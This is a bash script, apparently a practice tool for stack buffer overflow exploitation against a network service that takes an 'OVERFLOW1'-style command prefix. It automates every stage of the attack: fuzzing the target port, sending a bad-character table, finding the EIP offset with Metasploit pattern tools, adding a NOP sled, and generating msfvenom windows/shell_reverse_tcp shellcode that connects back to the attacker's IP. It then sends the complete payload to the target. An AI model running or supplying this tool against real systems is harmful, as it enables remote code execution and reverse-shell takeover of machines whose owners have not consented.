#!/bin/bash

target () {
    echo $BOLD"What is the IP address of the target?"
    read targetIP
    echo $BOLD"What is the Port of the target?"
    read port
    echo $BOLD"What is the Prefix you want to send? OVERFLOW1 for example"
    read prefix
    echo -n $prefix >> ./payload
    echo -n " " >> ./payload
}

#FUNCTION 2---------------------------------------------------------------------------------
# adding specific amount of A characters to the payload file.
addingbytes () {
    echo "How much A you want to send?"
    read Achars
    printf '%0.sA' $(seq 1 $Achars ) >> ./payload
}

#FUNCTION 3----------------------------------------------------------------------------------
addingbytesinloop () {
    printf '%0.sA' $(seq 1 100 ) >> ./payload
    cat ./payload > /dev/tcp/$targetIP/$port
    timeout 0.6s nc $targetIP $port > ./nctest
}

#FUNCTION 4-----------------------------------------------------------------------------------
# sending all possiable chars to find badchars
badchars () {
    echo "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10" >> ./payload
    echo "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" >> ./payload
    echo "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" >> ./payload
    echo "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" >> ./payload
    echo "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" >> ./payload
    echo "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" >> ./payload
    echo "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" >> ./payload
    echo "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" >> ./payload
    echo "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" >> ./payload
    echo "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" >> ./payload
    echo "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" >> ./payload
    echo "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" >> ./payload
    echo "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" >> ./payload
    echo "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" >> ./payload
    echo "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" >> ./payload
    echo "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" >> ./payload
}


#FUNCTION 5-------------------------------------------------------------------------------
exactoffset () {
    echo "How much bytes should be in the Pattern_create payload?"
    read offset
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $offset > ./offset
    cat ./payload ./offset > /dev/tcp/$targetIP/$port
    echo "What is the EIP you want to compare with Pattern_offset?"
    read EIP
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l $offset -q $EIP
    truncate -s 0 ./payload
}

#FUNCTION 6------------------------------------------------------------------------------
#Generate padding between the module and the payload
generatepadding () {
    echo "How much bytes padding you want to add between the module and the payload?
    Choose option (1-3)
        1: 8
        2: 16
        3: 32"
    read answer2
    case $answer2 in
    1)
        echo "\x90\x90\x90\x90\x90\x90\x90\x90" >> ./payload
    ;;
    2)
        echo "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" >> ./payload
    ;;
    3)
        echo "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" >> ./payload
    ;;
    esac
}

#FUNCTION 7------------------------------------------------------------------------------
#Generate malicious shellcode and add it to the ./payload file
generateshellcode () {
        echo "What are the badchars?"
    read badcharsshell
        echo "What is your own IP where the shellcode should connect to?"
    read ownip
        echo "What is your own port where the shellcode should connect to?"
    read ownport
        msfvenom -p windows/shell_reverse_tcp LHOST=$ownip LPORT=$ownport EXITFUNC=thread -f c -a x86 -b "$badcharsshell" >> ./shellcode
        sed -i "s/;//" ./shellcode
        sed -i '1d' ./shellcode
        cat ./shellcode >> ./payload
}

#------------------------------MAIN MENU--------------------------------------------------
echo $BLUE $BOLD "Welcome to Animmos Buffer Overflow bashscript, the following options are available.

1:$FG_RED Fuzzing, send a growing amount of bytes$BLUE
2:$FG_RED Send a fixed amount of bytes$BLUE
3:$FG_RED BadChars Check$BLUE
4:$FG_RED Check the exact offset$BLUE
5:$FG_RED generate Shellcode$BLUE

Select Option (1-4)"
read answer

case $answer in
    #------------------------------------------------------------------------------- 1 
    1) 
        target
        timeout 0.2s nc $targetIP $port > ./nctest
        while [[ $(wc -l < ./nctest) -gt 0 ]]
        do
                grep -i "A" ./payload
                addingbytesinloop
        done

        echo $BOLD $BLUE"the programm broke at +-" & grep -i "A" ./payload | wc -c
        echo $BLUE"bytes"
        rm ./payload
        rm ./nctest
    ;;
    #---------------------------------------------------------------------------------- 2
    2)
        target
        addingbytes
        cat ./payload > /dev/tcp/$targetIP/$port
        truncate -s 0 ./payload
    ;;
    #--------------------------------------------------------------------------------- 3
    3) 
        target
        addingbytes
        badchars
        #echo "Do you want to delete one bad char? \x00 if answer is NO!!"
        #read deletebadcharA
        echo "Do you want to delete one bad char? \x00 if the answer is NO!!"
        read deletebadcharB
        echo $deletebadcharB
        #sed -i "s|$deletebadcharA||"
        sed "s|$deletebadcharB||" ./payload > /dev/tcp/$targetIP/$port
        truncate -s 0 ./payload
        #cat ./payload > /dev/tcp/$targetIP/$port
    ;;
    #----------------------------------------------------------------------------------- 4
    4)
        target
        exactoffset
    ;;
    #----------------------------------------------------------------------------------- 5
    5)
        target
        addingbytes
        echo "what is the name of the module? \x03\x12\x50\x62 for example"
        read module
        echo $module >> ./payload
        generatepadding
        generateshellcode
        cat ./payload > /dev/tcp/$targetIP/$port
esac